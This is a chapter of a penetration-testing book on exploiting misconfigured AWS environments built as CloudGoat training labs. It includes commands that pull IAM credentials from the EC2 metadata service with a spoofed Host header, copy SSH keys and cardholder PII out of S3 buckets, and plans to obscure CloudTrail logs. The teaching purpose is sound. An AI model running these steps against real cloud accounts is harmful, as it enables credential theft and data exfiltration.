- en: '8'
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Cloud Security Exploitation
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Cloud adoption has significantly changed the way organizations collect, process,
    and store the data of end users. Some businesses automatically assume that their
    cloud providers will take care of their cybersecurity, but every cloud consumer,
    be it an individual or a business, must be aware that it’s a shared responsibility.
    Having said that, the majority of the time, when testers successfully get access
    to an internal network, they think they are almost done with the test, assuming
    they can then proceed to compromise the network or enterprise.
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter, we will explore different types of attacks that pentesters
    can leverage if they gain a foothold into a cloud environment. In particular,
    we will explore AWS and identify multiple processes for circumventing security
    controls and demonstrate this using the tools in Kali Linux.
  prefs: []
  type: TYPE_NORMAL
- en: 'By the end of this chapter, you will have learned how to attack misconfigured
    cloud services by covering the following topics:'
  prefs: []
  type: TYPE_NORMAL
- en: Basic principles of cloud services
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Vulnerability scanning and application exploitation in EC2 instances
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Reaching AWS IAM keys
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Testing for S3 bucket misconfiguration
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Exploiting security permission flaws
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Obfuscating CloudTrail logs
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: We will explore the basic principles of cloud services and different deployment
    models.
  prefs: []
  type: TYPE_NORMAL
- en: Introduction to cloud services
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Cloud computing, in general, is the on-demand availability of computing resource
    services, particularly storage and computing power for consumers. The main principles
    of cloud computing are on-demand, self-service broad network access, multi-tenancy,
    resource pooling, elasticity, scalability, and measured services. *Table 8.1*
    provides details on the four deployment models cloud service providers offer.
    If any of these deployment models are successfully exploited and communication
    is established, then it provides persistent access to achieve the objective of
    the pentest:'
  prefs: []
  type: TYPE_NORMAL
- en: '| **Deployment Model** | **Description** |'
  prefs: []
  type: TYPE_TB
- en: '| Private Cloud | Cloud infrastructure is exclusive and provisioned only for
    a specific organization. Similar to traditional data centers but hosted on the
    cloud. |'
  prefs: []
  type: TYPE_TB
- en: '| Community Cloud | This is a cloud infrastructure that is shared between the
    specific community of consumers from organizations that have a shared interest.
    |'
  prefs: []
  type: TYPE_TB
- en: '| Public Cloud | Cloud infrastructure that is provisioned for the general end
    user public. |'
  prefs: []
  type: TYPE_TB
- en: '| Hybrid Cloud | Cloud infrastructure that combines any two of the above models,
    usually a combination of private and public cloud, on-premises and private cloud,
    or on-premises and public cloud. |'
  prefs: []
  type: TYPE_TB
- en: 'Table 8.1: Cloud deployment models'
  prefs: []
  type: TYPE_NORMAL
- en: 'Before working out what type of testing you might have to perform on any given
    client environment, it is important to understand the following fundamental cloud
    service models:'
  prefs: []
  type: TYPE_NORMAL
- en: '| **Service Model** | **Description** |'
  prefs: []
  type: TYPE_TB
- en: '| Software as a Service | In this service, the cloud vendor provides software
    to organizations whereby they pay as they go. Some examples of SaaS cloud service
    providers include Dropbox, G Suite, Microsoft Office 365, Slack, and Citrix Content
    Collaboration. |'
  prefs: []
  type: TYPE_TB
- en: '| Platform as a Service | In this service, the cloud vendor provides both the
    hardware and software to the organizations. Some examples include AWS Elastic
    Beanstalk, Heroku, Windows Azure (mostly used as PaaS), Force.com, OpenShift,
    and Apache Stratos. |'
  prefs: []
  type: TYPE_TB
- en: '| Infrastructure as a Service | In this service, mainly storage, networking,
    and virtualization are provided to organizations, who pay as they go. Examples
    include AWS EC2, Rackspace, **Google** **Compute Engine** (**GCE**), Digital Ocean,
    etc. |'
  prefs: []
  type: TYPE_TB
- en: 'Table 8.2: Cloud service models'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 8.1* depicts how the security responsibility changes based on the service
    models:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_08_01.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.1: Cloud service model and responsibilities'
  prefs: []
  type: TYPE_NORMAL
- en: Having understood the basics, we will now be setting up our AWS lab to configure
    deliberately vulnerable instances using the CloudGoat AWS deployment tool that
    we installed in *Chapter 1*, *Goal-Based Penetration Testing*. Be aware that usage
    of AWS services will incur costs, even if CloudGoat is left unused after deploying
    the vulnerable instances. Additionally, these instances will open up your cloud
    infrastructure to a variety of attacks.
  prefs: []
  type: TYPE_NORMAL
- en: Scenarios on accessing these cloud services would even begin from the initial
    reconnaissance phase wherein attackers explore all the GitHub repositories, pastebin,
    or any data dumping sites of a target organization and could potentially obtain
    the access key and the secret.
  prefs: []
  type: TYPE_NORMAL
- en: 'The following are the CloudGoat options available to configure and practice
    AWS-specific attacks. To understand the options, testers can run a Docker image
    by entering `docker run –it rhinosecuritylabs/Cloudgoat:latest` in the terminal,
    which should lead us to the CloudGoat shell, where we run `./cloudgoat help`,
    which should provide us with the following five options shown in *Figure 8.2*:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_08_02.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.2: Running CloudGoat from the Docker image'
  prefs: []
  type: TYPE_NORMAL
- en: 'Testers who receive any error messages relating to Terraform, such as `OSError:
    [Errno 8] Exec format error: "terraform" or "Terraform not found"`, can resolve
    this issue by following these steps to replace the default Terraform with the
    latest version:'
  prefs: []
  type: TYPE_NORMAL
- en: Run `wget https://releases.hashicorp.com/terraform/1.0.10/terraform_1.0.10_linux_amd64.zip`
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Unzip `terraform_1.0.10_linux_amd64.zip`
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Run `mv /usr/bin/terraform terraform_old`
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Run `mv terraform /usr/bin/`
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'The following shows details of the first four options:'
  prefs: []
  type: TYPE_NORMAL
- en: '`config` – This option allows us to manage different aspects of our CloudGoat
    installation, especially the IP whitelist and our default AWS profile:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`whitelist` – It is always recommended that testers whitelist the IP address
    that they will be conducting the testing from due to the potentially vulnerable
    resources that are deployed within the AWS infrastructure. This command stores
    the IP address or IP address ranges within the `./whitelist.txt` file within the
    base project directory. Additionally, you can add the `–auto` argument and this
    tool will automatically make a network request. Use `curl` `ifconfig.co` to find
    your IP address and then create the whitelist file with the result.'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`profile` – CloudGoat will need the AWS profile to be manually configured by
    default. Running this command will prompt testers to enter profile details such
    as the AWS access key and secret and they will be stored in the `config.yml` file
    within the project directory. Attackers can choose to create their own `config.yml`
    file.'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`create` – This option deploys a scenario to the AWS account. If you deploy
    a scenario twice, CloudGoat will destroy the existing one and create a new scenario.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`list` – This will show all the deployed scenarios, undeployed scenarios, and
    more information about a specific deployed scenario.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`destroy` – This will shut down and delete all the resources that were created
    by CloudGoat.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'To configure CloudGoat to a specific profile, run `./cloudgoat.py config profile
    <profilename>` in the terminal:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: 'It is very important that we configure the AWS resources as accessible only
    by the IP that you will be connecting from:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: 'For our next section, we will deploy a vulnerable web application to perform
    application-specific exploitation within AWS. This can be achieved by running
    `./cloudgoat create rce_web_app --profile masteringkali`. This should begin the
    deployment of the cloud resources by CloudGoat to your AWS account and once the
    deployment is complete, you should be able to see the confirmation with the cloud
    access details, as shown in *Figure 8.3*:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: '![](../Images/B17765_08_03.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.3: Deploying rce_web_app using CloudGoat and our AWS profile'
  prefs: []
  type: TYPE_NORMAL
- en: 'Once the deployment of the web application and the supporting resources is
    complete, testers should be presented with *Figure 8.4* as successful completion
    of the deployment:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_08_04.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.4: Successful deployment of the vulnerable setup'
  prefs: []
  type: TYPE_NORMAL
- en: Testers can utilize the access key and secret key generated by CloudGoat to
    perform the penetration test on the deployed scenario. As a traditional step,
    testers can utilize vulnerability scanners such as Scout Suite or Prowler.
  prefs: []
  type: TYPE_NORMAL
- en: Vulnerability scanning and application exploitation in an EC2 instance
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: The first step is to equip our Kali Linux to install the AWS client by running
    `sudo apt install awscli` from the terminal, and then we can leverage the tools
    to understand what permissions we have with the current API and secret keys.
  prefs: []
  type: TYPE_NORMAL
- en: Configure the AWS profile by running `sudo aws configure --profile <profilename>`
    in the terminal.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this case, we will configure the two profiles within our Kali Linux:'
  prefs: []
  type: TYPE_NORMAL
- en: For demonstration purposes, we will change the suggested `Lara` profile name
    (see *Figure 8.4*) to **RCE** (**Remote Code Execution**) with the access key
    and secret key.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: We will create a `mcduck` profile as suggested by CloudGoat with the keys generated
    during the CloudGoat scenario deployment.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs:
  - PREF_IND
  type: TYPE_PRE
- en: 'To confirm that our profiles are working, we can list down the **S3** (which
    is Amazon’s **Simple Storage Service**) buckets that these profiles can access
    by running the following command and testers should be able to see them as in
    *Figure 8.5*:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: '![](../Images/B17765_08_05.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.5: Configuring the AWS profile within Kali Linux'
  prefs: []
  type: TYPE_NORMAL
- en: Attackers can leverage automated tools such as Scout Suite and Prowler to understand
    misconfigurations/excessive permissions quickly.
  prefs: []
  type: TYPE_NORMAL
- en: 'Scout Suite is an open-source cloud security auditing tool that works on multi-cloud
    environments such as AWS, GCP, and Azure. Additionally, this tool is in the alpha
    phase for Oracle and Alibaba Cloud. This tool is written in Python and utilizes
    exposed APIs to gather configuration details to provide the attack surface of
    a given cloud environment. The project is actively maintained by NCC Group. There
    is a commercial service to this tool as well. Scout can be installed to Kali Linux
    by cloning the repository locally and installing the dependencies by running the
    following commands in the terminal:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: '*Figure 8.6* shows the launch of the Scout security auditing tool on AWS using
    a specific profile.'
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_08_06.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.6: Running Scout on AWS using our profile'
  prefs: []
  type: TYPE_NORMAL
- en: 'Once the scanning is complete, Scout creates an HTML report within the same
    folder as the tool was run. Testers will be able to list the misconfigurations/vulnerabilities
    relating to the profile that was scanned. *Figure 8.7* depicts the report output:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_08_07.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.7: Output report of Scout'
  prefs: []
  type: TYPE_NORMAL
- en: 'Further subsections detail AWS features/options and descriptions that will
    help pentesters understand what they should focus on, as shown in *Figure 8.8*:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_08_08.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.8: Detailed IAM section within the Scout report'
  prefs: []
  type: TYPE_NORMAL
- en: '**Prowler** is another security tool specifically designed to perform checks
    on AWS that covers security best practices across all AWS regions and groups.
    The tool also has a prebuilt mapping to various benchmarks (CIS, GDPR, HIPAA,
    PCI-DSS, ISO-27001, FFIEC, SOC2, and others). This tool is written in a combination
    of multiple Bash scripts that perform local checks with the existing privileges
    of the profile that is configured. This can be installed on Kali Linux by cloning
    the repository by running the following commands in the terminal:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: 'The latest version of Prowler is v2.5.0\. Testers can verify the scanning activity
    by simply running `sudo ./prowler –p <profile name>` as shown in *Figure 8.9*:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Text  Description automatically generated](../Images/B17765_08_09.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.9: Running the Prowler cloud security tool from Kali Linux'
  prefs: []
  type: TYPE_NORMAL
- en: Attackers can leverage the AWS Command Line Interface cheat sheet at [https://www.bluematador.com/learn/aws-cli-cheatsheet](https://www.bluematador.com/learn/aws-cli-cheatsheet)
  prefs: []
  type: TYPE_NORMAL
- en: 'Let’s go ahead and identify the list of instances that are available to the
    profile RCE that we created by running the following command in the terminal:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: 'This should provide the instance details as shown in *Figure 8.10*, with the
    public and internal IP details:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Text  Description automatically generated](../Images/B17765_08_10.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.10: Detailed IAM section within the Scout report'
  prefs: []
  type: TYPE_NORMAL
- en: In the details of the instance (the full output is not displayed in *Figure
    8.10*), we can see that the public IP is configured to specific security groups.
    If you locate `"RootDeviceType"` from the output of the above command it will
    be pointing to `"ebs"`, which means the IP address is not publicly accessible.
  prefs: []
  type: TYPE_NORMAL
- en: 'The next step is to find out what load balancers are configured to this device
    by running `sudo aws elbv2 describe-load-balancers –-profile RCE` in the Kali
    Linux terminal:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: 'The output of the EC2 load balancers comes back with the specific DNS name
    as shown in *Figure 8.11*:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Text  Description automatically generated](../Images/B17765_08_11.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.11: Extracting elastic load balancer details'
  prefs: []
  type: TYPE_NORMAL
- en: 'Finally, we are now able to reach the load balancer as shown in *Figure 8.12*.
    The next step is to identify what else is available:'
  prefs: []
  type: TYPE_NORMAL
- en: '![A screenshot of a computer  Description automatically generated with medium
    confidence](../Images/B17765_08_12.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.12: Accessing the elastic load balancer public DNS'
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we will find our profile’s permission within the S3 bucket by running
    `sudo aws s3 ls –profile RCE` in the terminal. This profile has access only to
    the logs folder within the S3 bucket as shown in *Figure 8.13*:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_08_13.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.13: Accessing the S3 buckets with the RCE profile'
  prefs: []
  type: TYPE_NORMAL
- en: 'We explore the logs folder by listing all the directories within the S3 bucket
    by running `sudo aws s3 ls s3://<bucket>/pathofthefile --profile –-region us-east-1`
    and copy the file by running the following command in the terminal as shown in
    *Figure 8.14*:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: '![Background pattern  Description automatically generated](../Images/B17765_08_14.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.14: Copying the log file from the S3 bucket'
  prefs: []
  type: TYPE_NORMAL
- en: 'Analyzing the log file, we find there are multiple requests that have `200`
    as the HTTP response from the server and have a unique HTML associated with it,
    as shown in *Figure 8.15*:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Background pattern  Description automatically generated](../Images/B17765_08_15.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.15: Analyzing the log file and identifying the URI'
  prefs: []
  type: TYPE_NORMAL
- en: 'Finally, accessing the URL takes us to the form submission, which is vulnerable
    to remote code execution, whereby testers will now be able to run commands on
    the server:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Graphical user interface, text, application  Description automatically generated](../Images/B17765_08_16.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.16: Successfully executing the command on the server'
  prefs: []
  type: TYPE_NORMAL
- en: 'We have now exploited remote code execution on the web application by leveraging
    the existing permissions to view the instances, load balancer configuration, and
    the files that were accessible from the S3 bucket. Let’s try the other profile
    (`mcduck`) to understand how we can further take over the running EC2 instance
    within the AWS estate. To view instance details testers can run `sudo aws ec2
    describe-instances --profile mcduck --region us-east-1` as shown in *Figure 8.17*:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_08_17.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.17: Identifying instances using the mcduck profile'
  prefs: []
  type: TYPE_NORMAL
- en: 'We can see the reservations and instance details with `imageID` and its placement.
    Further within the details, we can find the public IP address and the DNS name
    of the instance along with all the networking and subnet details, as shown in
    *Figure 8.18*:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_08_18.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.18: Identifying the public IP and public DNS of the instance'
  prefs: []
  type: TYPE_NORMAL
- en: 'Attackers with the public IP can now explore any kind of key information that
    might be available within the S3 buckets. To view what S3 buckets are accessible,
    run `sudo aws s3 ls ––profile ––region us-east-1`, and then copy the folder type
    `sudo aws s3 cp s3://bucket/folder/ ./keys ––profile mcduck ––region us-east-1`
    as shown in *Figure 8.19*:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: '![Text  Description automatically generated](../Images/B17765_08_19.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.19: Accessing the S3 profiles using the mcduck profile'
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, this profile only has access to the keystore and we have copied the public
    and private key to our local Kali Linux. The next step is to change the file permission
    of the private key by running `sudo chmod 400 cloudgoat`, and then secure shell
    the login to the EC2 instance directly by running `ssh –i cloudgoat ubuntu@PublicIP`,
    as shown in *Figure 8.20*:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE11]'
  prefs: []
  type: TYPE_PRE
- en: '![](../Images/B17765_08_20.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.20: Logging in to the AWS instance from the acquired private key'
  prefs: []
  type: TYPE_NORMAL
- en: 'Now that we can gain internal access to the Ubuntu EC2 instance, access the
    metadata service by directly accessing `http://169.254.169.254/latest/user-data`
    within the terminal of the remote system:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE12]'
  prefs: []
  type: TYPE_PRE
- en: '![](../Images/B17765_08_21.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.21: Accessing the metadata service within the EC2 instance'
  prefs: []
  type: TYPE_NORMAL
- en: 'Attempt to log in to `postgresql` with the username and password to identify
    the secret password:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE13]'
  prefs: []
  type: TYPE_PRE
- en: '![](../Images/B17765_08_22.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.22: Successfully connecting to the database and accessing the plain
    text password within the database'
  prefs: []
  type: TYPE_NORMAL
- en: 'Within the EC2 instance, we can now check what S3 buckets are accessible. Before
    you can access the buckets, ensure Ubuntu is installed with `awscli` by running
    `sudo apt-get install awscli` in the terminal and then run the following commands
    to view the end goal as shown in *Figure 8.23*:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE14]'
  prefs: []
  type: TYPE_PRE
- en: '![Text  Description automatically generated](../Images/B17765_08_23.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.23: Exfiltrating the database details from the S3 bucket'
  prefs: []
  type: TYPE_NORMAL
- en: 'A final important step is to destroy the setup by returning to the CloudGoat
    Docker image and running `./cloudgoat.py destroy all`. You should get a confirmation
    as shown in *Figure 8.24*:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Text  Description automatically generated](../Images/B17765_08_24.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.24: Destroying the rce_web_app cloud setup using CloudGoat'
  prefs: []
  type: TYPE_NORMAL
- en: We have explored the security misconfiguration and vulnerable web applications
    within the AWS setup. We will now explore the different methodologies that can
    be leveraged to exploit S3 buckets in the coming section.
  prefs: []
  type: TYPE_NORMAL
- en: Testing for S3 bucket misconfiguration
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: S3 is typically used by organizations to store documents, code, file uploads,
    and so on and so forth. Typically, a bucket can be either public or private. When
    public, all users can list the contents, and when private, only the selected set
    of users can list the contents. Although S3 exploitation has always been in the
    news, notably for developers storing mission-critical information in a bucket
    marked as “public.” In this section, we will explore identifying S3 buckets and
    exploiting misconfiguration to gain access to the internal AWS infrastructure.
  prefs: []
  type: TYPE_NORMAL
- en: 'To practice S3 bucket misconfiguration, we will be setting up a vulnerable
    S3 instance using CloudGoat by running the following command within the CloudGoat
    Docker image:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE15]'
  prefs: []
  type: TYPE_PRE
- en: 'Once the setup is complete, testers should be able to see the following message
    from the deployment tool with the AWS account ID and the target IP address, as
    shown in *Figure 8.25*:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_08_25.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8.25: Successful creation of the cloud_breach_s3 AWS environment using
    CloudGoat'
  prefs: []
  type: TYPE_NORMAL
- en: 'Identifying what is running on the external IP, attackers can choose to run
    a port scan on the IP. In this case, port `80` is open and accessible:'
  prefs: []
  type: TYPE_NORMAL
- en: Access the IP using the curl utility by running `curl http://<IP Address>`.
    You will receive an error message regarding the EC2 metadata service, as shown
    in *Figure 8.26*:![](../Images/B17765_08_26.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.26: Accessing the public IP address'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Cloud providers certainly do have the ability to manage credentials for resources
    in any cloud consumers’ cloud-native applications. If this is done correctly,
    then the storage of credentials in clear text or in a source code repository can
    be avoided. In AWS, the **instance metadata service** (**IMDS**) provides the
    data about a given instance that you can use to configure or manage the running
    instances. AWS uses the `169.254.169.254` IP address to return the hosted metadata
    service. So, we will be adding the host header to retrieve the contents from the
    target IP by running `curl http://<IPAddress> -H 'Host:169.254.169.254'`, which
    should return the contents of the root folder of the website as seen in *Figure
    8.27*. Attackers can choose to use Burp Suite to intercept the traffic and add
    a host header to the request and browse the folders and directories.![](../Images/B17765_08_27.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.27: Successfully accessing the IP with the metadata service'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: After browsing through the directories, we make a request to the `/latest/meta-data/iam/security-credentials/cg-bank-WAF-Role-cg<ID>`
    file that returns the `AccessKeyID`, `secretAccessKey`, and session token as shown
    in *Figure 8.28*. The session token indicates that the credentials are time-based.
    However, if the testers encounter IMDS v2, it will then require an additional
    token to retrieve the credentials:![](../Images/B17765_08_28.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.28: Successfully generating the credentials using the AWS metadata
    service'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'The next step is to equip our Kali Linux with the AWS profile from the above
    information, as shown in *Figure 8.29*:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE16]'
  prefs:
  - PREF_IND
  type: TYPE_PRE
- en: '![](../Images/B17765_08_29.png)'
  prefs:
  - PREF_IND
  type: TYPE_IMG
- en: 'Figure 8.29: Creating a new profile within Kali Linux for the S3 exploit'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Once the profile is configured, we will go ahead and add our session token
    by editing the AWS credential file. The default location of this file is `~/.aws/credentials`.
    In our case, we have run all the `aws` commands using `sudo`, hence all the credentials
    and other details will be stored under the root user. We will be editing the file
    located in /`root/.aws/credentials` by using our favorite editor:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE17]'
  prefs:
  - PREF_IND
  type: TYPE_PRE
- en: 'Add the `aws_session_token` obtained in *step 3*, as shown in *Figure 8.30*:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![](../Images/B17765_08_30.png)'
  prefs:
  - PREF_IND
  type: TYPE_IMG
- en: 'Figure 8.30: Adding aws_session_token to the credential file'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Now, the next step is to check if we are able to access the S3 buckets by running
    the following command in the terminal:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE18]'
  prefs:
  - PREF_IND
  type: TYPE_PRE
- en: 'From the previous step, we can now download the contents of the S3 bucket to
    our local host by running the command shown in *Figure 8.31*:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE19]'
  prefs:
  - PREF_IND
  type: TYPE_PRE
- en: '![](../Images/B17765_08_31.png)'
  prefs:
  - PREF_IND
  type: TYPE_IMG
- en: 'Figure 8.31: Copying the S3 bucket contents to the local system'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: We have now exploited the misconfigured S3 bucket and exfiltrated the data from
    the target organization. You should now be able to view the cardholder data with
    all the **personally identifiable information** (**PII**) as shown in *Figure
    8.32*:![](../Images/B17765_08_32.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.32: Contents of the copied data that includes personally identifiable
    information'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'The final step is to go back to the CloudGoat Docker image and ensure that
    we destroy the instance created to avoid any accidental exposure to real attackers
    or billing charges from Amazon by running the following command within the Docker
    image:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE20]'
  prefs:
  - PREF_IND
  type: TYPE_PRE
- en: Understanding misconfiguration in S3 could lead to data exfiltration. How about
    if there is a misconfiguration in the permissions that are set for users? We will
    explore that in the next section.
  prefs: []
  type: TYPE_NORMAL
- en: Exploiting security permission flaws
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'The following are the most common vulnerabilities within AWS cloud services:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Excessive public subnets** – The majority of organizations utilize the default
    **VPC** (**Virtual Private Cloud**) feature that is built into AWS and make few
    changes when they utilize AWS services, taking the easy approach. However, this
    approach has been proven dangerous in many cases (an example would be botnet-based
    crypto-ransomware). Public subnets are accessible by anyone on the internet, potentially
    exposing something that shouldn’t normally be available.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**IAM** (**Identity and Access Management**) issues in organizations that do
    not utilize two- or multi-factor authentication for high-privileged accounts and
    utilize a single account for almost everything, providing the same level of access
    to all new accounts, putting them at risk. There have been cases where employees’
    accounts have been compromised through email phishing leading to massive ransomware
    attacks that cost the organization almost the same amount of money it would take
    to rebuild the entire company.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Misconfigured S3 buckets** – In the previous section, we explored S3 bucket
    permission misconfiguration. This is one of the most common themes noted during
    cloud penetration testing. Although buckets are private by default, sometimes
    IT operations/development teams or the third parties who manage these types of
    infrastructure tend to make them public. That opens them up to the inevitable
    threat of adversaries, finding misconfigured S3 buckets with sensitive information
    such as private keys or unattended files, including backups or log files.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Origin servers** – The majority of the cloud service providers utilize a
    **Content Delivery Network** (**CDN**) to distribute content to high-volume customers.
    Most of the time, these are misconfigured, leaking the origin of the servers.
    One of our pentesters gave an example of how this can lead to a security breach.
    During penetration testing, it is not uncommon to find the origin servers and
    directly hit their vulnerabilities and even take over the database with brute-force-style
    attacks.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**SSRF** (**Server Side Request Forgery**) – This is an attack that can be
    abused to take advantage of legitimate AWS functionality and gain access to metadata
    information, and if exploited successfully attackers can retrieve valid user credentials
    for an IAM role. We will explore this attack in this section.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**DNS records** – Most of the time, during the initial reconnaissance, attackers
    can easily identify the S3 bucket details with the subdomain of the organization.
    The issue arises when the operations team forgets to update their DNS records
    in a timely fashion, or even, surprisingly, decommissions unattended S3 buckets
    still live and available to anyone on the public internet.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'With all the information above, we will now set up CloudGoat to create a vulnerable
    AWS deployment where we will exploit legitimate AWS functionality by performing
    an SSRF attack. The following are the step-by-step instructions to perform this
    attack:'
  prefs: []
  type: TYPE_NORMAL
- en: Deploy the vulnerable AWS setup by returning to the CloudGoat Docker image and
    run `./cloudgoat.py create ec2_ssrf --profile masteringkali` in the terminal,
    and that should set up the infrastructure and provide us with the following confirmation,
    which includes an access ID and secret key:![](../Images/B17765_08_33.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.33: Creating the ec2_ssfr AWS environment using CloudGoat'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Create an AWS profile within Kali Linux by running `sudo aws configure ––profile
    ssrf` as shown in *Figure 8.34*, and enter the `Access Key ID` and `Secret Access
    Key`:![](../Images/B17765_08_34.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.34: Configuring the AWS profile within Kali Linux'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
